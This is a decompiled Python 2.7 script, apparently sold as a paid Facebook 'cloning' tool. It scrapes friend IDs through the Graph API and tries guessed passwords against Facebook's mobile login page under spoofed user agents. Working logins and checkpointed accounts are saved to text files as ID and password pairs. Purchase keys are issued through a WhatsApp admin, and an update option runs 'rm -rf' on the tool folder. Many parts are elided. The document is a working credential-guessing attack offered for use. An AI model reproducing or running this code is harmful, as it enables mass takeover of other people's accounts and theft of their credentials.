...
# File: Mr_FB-KING-PAID.py (Python 2.7)
...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;34m Author \x1b[1;97m : \033[1;34m        FB-KING
\033[1;31m\033[1;35m Facebook\x1b[1;97m:  \033[1;35m       Mahin Ahmed   
\033[1;31m\033[1;33m TEAM\x1b[1;97m    : \033[1;33m        B-M-X
\033[1;31m\033[1;32m Version\x1b[1;97m : \033[1;32m        2.0
\033[1;31m\033[1;31m Tools\x1b[1;97m   : \033[1;31m        Paid
\033[1;37m------------------------\033[1;37m------------------------"")
dec = '2'
server = '2'
rsauser = 'Mozilla/5.0 (Linux; Android 12; RMX3393) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
header = {
...
def main_apv():
    imt = '~~Devil-Boy-FB-KING~~'
    os.system('clear')
    print logo
    
    try:
        key1 = open('/sdcard/.kausar.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        print '           Your Key Not Approved'
        print '           Hello Dear Aita Paid Cammonds Bro'
        print '           Apnar Key Approved Korar Jonno'
        print '           First Permeant Koren Than'
        print '           Admin Er WhatsApp E Knock Den'
        print '           Permanent Kore Apnar Key Approved Kore Nen'
        print ''
        imt = uuid.uuid4().hex[:30]
        print '         YOUR KEY : ' + imt
        kok = open('/sdcard/.FB-KING.txt', 'w')
        kok.write(imt)
        kok.close()
        print ''
        print '           Uporer Key Copy Koren'
        print '           Copy Korar Por Admin Whatsapp Number E Send Kore Den'
        print ''
        print ''
        print ''
        print '     Age Permeant Kore Key Approved Kore Nen Bro'
        raw_input('    Press enter to check Approval')
...
def main_input():
    ...
    if mx == '1':
        ...
        print ''
        print ''
        print '\x1b[1;92m        Congratulations Bro Your Pro User'
        print '\x1b[1;92m        Member In Mr.FB-KING Paid Commands '
        print '\x1b[1;91m        ENJOY Koro Bro'
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        ...
        os.system('rm -rf PAID')
        os.system(' cd PAID')
        os.system(' python2 MAHIN.py')
        time.sleep(5)
        xox('\x1b[92;1m\n TOOL UPDATE SUCCESSFUL :)\n')
        time.sleep(2)
        main_system()
    elif mx == '7':
        os.system('xdg-open https://wa.me/+01612278337')
        time.sleep(3)
        main_system()
    else:
        print 'invild option'
...
def numcloning():
    ...
    def main(arg):
        user = arg
        lines = random.choice([
            'Mozilla/5.0 (Linux; U; Android 12; th-th; RMX3393 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; RMX3393) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; RMX3393) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36',
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[FB-KING-OK] ' + coc + user + ' | ' + pass1
                ok = open('random-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[FB-KING-CP] ' + coc + user + ' | ' + pass1
                cp = open('MAHIN random-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    print g + '[=] Extracting From FB-KING : ' + my_line[:15]
    ...
    my_line = file.readline()
    count.append(my_line)
    print g + '[=] Extracting From zFB-KING : ' + my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck = open('jok.txt', 'a')
    for i in z['data']:
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[IFB-KING-OK] ' + uid + ' | ' + pass1
                ok = open('FB-KING-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[FB-KING-CP] ' + uid + ' | ' + pass1
                cp = open('FB-KING-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[FB-KING-OK] ' + uid + ' | ' + pass2
                    ok = open('FB-KING-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[FB-KING-CP] ' + uid + ' | ' + pass2
                    cp = open('FB-KING-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[FB-KING-OK] ' + uid + ' | ' + pass3
                        ok = open('FB-KING-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[FB-KING-CP] ' + uid + ' | ' + pass3
                        cp = open('FB-KING-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[FB-KING-OK] ' + uid + ' | ' + pass4
                            ok = open('FB-KING-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[IFB-KING-CP] ' + uid + ' | ' + pass4
                            cp = open('FB-KING-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[FB-KING-OK] ' + uid + ' | ' + pass5
                                ok = open('FB-KING-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[FB-KING-CP] ' + uid + ' | ' + pass5
                                cp = open('FB-KING-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[FB-KING-OK] ' + uid + ' | ' + pass1
                ok = open('FB-KING-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;91m[FB-KING-CP] ' + uid + ' | ' + pass4
                            cp = open('FB-KING-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;91m[IFB-KING-CP] ' + uid + ' | ' + pass5
                                cp = open('FB-KING-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
...
def mineExt():
    ...
    my_line = file.readline()
    count.append(my_line)
    print g + '[*] Extracting From MAHIN : ' + my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck = open('jok.txt', 'a')
    for i in z['data']:
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    print '\x1b[1;91m[MAHIN-CP] ' + uid + ' | ' + pass2
                    cp = open('MAHIN-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[FB-KING-OK] ' + uid + ' | ' + pass6
                                    ok = open('FB-KING-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[FB-KING-CP] ' + uid + ' | ' + pass6
                                    cp = open('FB-KING-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
